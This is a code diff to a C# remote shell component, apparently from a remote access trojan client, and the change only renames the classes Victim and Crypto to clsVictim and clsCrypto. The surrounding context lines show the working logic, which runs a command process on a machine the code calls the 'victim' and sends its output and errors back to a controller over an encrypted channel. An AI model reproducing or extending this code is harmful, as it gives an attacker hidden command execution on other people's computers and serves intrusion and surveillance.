@@ -12,7 +12,7 @@ namespace winClient48
 {
     public class RemoteShell
     {
-        private Victim v;
+        private clsVictim v;
 
         private TextBox cmd_textbox = new TextBox();
         private Process cmd_proc;
@@ -46,7 +46,7 @@ namespace winClient48
             Keys.Right,
         };
 
-        public RemoteShell(Victim v, string exePath, string initPath)
+        public RemoteShell(clsVictim v, string exePath, string initPath)
         {
             last_pattern = string.Empty;
             idx_suggestion = 0;
@@ -60,7 +60,7 @@ namespace winClient48
             Init(v);
         }
 
-        private void Init(Victim v)
+        private void Init(clsVictim v)
         {
             try
             {
@@ -93,7 +93,7 @@ namespace winClient48
                     while (bSendStdOutAndErr)
                     {
                         string line = sr_out.ReadLine();
-                        v.encSend(2, 0, "shell|output|" + Crypto.b64E2Str(Environment.NewLine + line));
+                        v.encSend(2, 0, "shell|output|" + clsCrypto.b64E2Str(Environment.NewLine + line));
 
                         if (cmd_sendPrompt)
                         {
@@ -111,7 +111,7 @@ namespace winClient48
                         try
                         {
                             string line = sr_err.ReadLine();
-                            v.encSend(2, 0, "shell|error|" + Crypto.b64E2Str(Environment.NewLine + line));
+                            v.encSend(2, 0, "shell|error|" + clsCrypto.b64E2Str(Environment.NewLine + line));
 
                             if (cmd_sendPrompt)
                             {
@@ -192,7 +192,7 @@ namespace winClient48
                 string sug = suggestion[idx_suggestion];
                 ls.Add(sug);
                 string line = string.Join(" ", ls.ToArray());
-                v.encSend(2, 0, "shell|tab|" + Crypto.b64E2Str(line));
+                v.encSend(2, 0, "shell|tab|" + clsCrypto.b64E2Str(line));
                 idx_suggestion++;
             }
             catch (Exception ex)
